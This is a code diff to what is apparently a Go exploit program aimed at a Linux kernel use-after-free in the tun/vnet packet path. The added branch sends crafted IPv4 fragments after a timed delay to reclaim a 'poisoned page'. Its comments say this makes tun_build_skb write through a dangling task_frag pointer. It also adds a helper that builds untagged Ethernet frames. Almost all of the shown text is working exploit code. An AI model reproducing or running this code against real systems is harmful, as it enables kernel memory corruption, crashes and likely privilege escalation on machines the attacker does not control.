@@ -154,6 +154,35 @@ func runStaleOptionsEgress(c cfg) error {
 		uint16(l2LenForTags(c.vlanTags)), 0); err != nil {
 		return fmt.Errorf("send malicious head fragment: %w", err)
 	}
+	if c.staleNaturalOverlap {
+		// Give forwarding and packet-socket clones from the first datagram a
+		// bounded window to release the poisoned page, then reclaim it with a
+		// second live jumbo fragment. Ordinary untagged completion frames take
+		// tun_build_skb and write through the dangling task_frag pointer.
+		time.Sleep(c.staleDelay)
+		overlapID := id + 1
+		l2 := l2LenForTags(c.vlanTags)
+		middlePayloadLen := c.staleFragPadLen - l2 - ipLen
+		middlePayload := bytes.Repeat([]byte{0x72}, middlePayloadLen)
+		middleIP := ipv4PacketWithOptionsFor(8, true, middlePayload, overlapID, nil, src, dst, ipProtoRaw)
+		middleFrame := egressFrame(middleIP, ifi.HardwareAddr, nextMAC, c.vlanTags)
+		if err := egressSendVnetFrame(tx, ifi.Index, nextMAC, middleFrame, false, 0,
+			uint16(c.staleFragHdrLen), 1400, 0, 0); err != nil {
+			return fmt.Errorf("send overlap reclaim fragment: %w", err)
+		}
+		overlapHeadIP := ipv4PacketWithOptionsFor(0, true, bytes.Repeat([]byte{0x68}, 8), overlapID, nil, src, dst, ipProtoRaw)
+		overlapHead := egressFrameWithoutVLAN(overlapHeadIP, ifi.HardwareAddr, nextMAC)
+		if err := egressSendFrame(tx, ifi.Index, nextMAC, overlapHead, false, 0, 0); err != nil {
+			return fmt.Errorf("send overlap head fragment: %w", err)
+		}
+		overlapTailIP := ipv4PacketWithOptionsFor(8+middlePayloadLen, false, bytes.Repeat([]byte{0x7a}, 8), overlapID, nil, src, dst, ipProtoRaw)
+		overlapTail := egressFrameWithoutVLAN(overlapTailIP, ifi.HardwareAddr, nextMAC)
+		if err := egressSendFrame(tx, ifi.Index, nextMAC, overlapTail, false, 0, 0); err != nil {
+			return fmt.Errorf("send overlap tail fragment: %w", err)
+		}
+		fmt.Printf("stale-egress: natural-overlap reclaim_id=0x%04x release_wait=%s padded=%d hdr_len=%d completion_l2=untagged\n",
+			overlapID, c.staleDelay, len(middleFrame), c.staleFragHdrLen)
+	}
 	fmt.Printf("stale-egress: iface=%s original_mtu=%d jumbo_mtu=65535 src=%s dst=%s next_hop=%s next_mac=%s route=%s/%d vlan_tags=%d padded=%d hdr_len=%d final_payload=%d max_chunk=%d id=0x%04x\n",
 		ifi.Name, originalMTU, src, dst, nextHop, nextMAC, routeIPv4(route.dest), route.prefix,
 		c.vlanTags, c.staleFragPadLen, c.staleFragHdrLen, len(finalPayload), maxChunk, id)
@@ -743,6 +772,15 @@ func egressFrame(ip []byte, src, dst net.HardwareAddr, tags int) []byte {
 		off += vlanLen
 	}
 	copy(f[l2:], ip)
+	return f
+}
+
+func egressFrameWithoutVLAN(ip []byte, src, dst net.HardwareAddr) []byte {
+	f := make([]byte, ethLen+len(ip))
+	copy(f[0:6], dst)
+	copy(f[6:12], src)
+	binary.BigEndian.PutUint16(f[12:], ipProtoEth)
+	copy(f[ethLen:], ip)
 	return f
 }
 
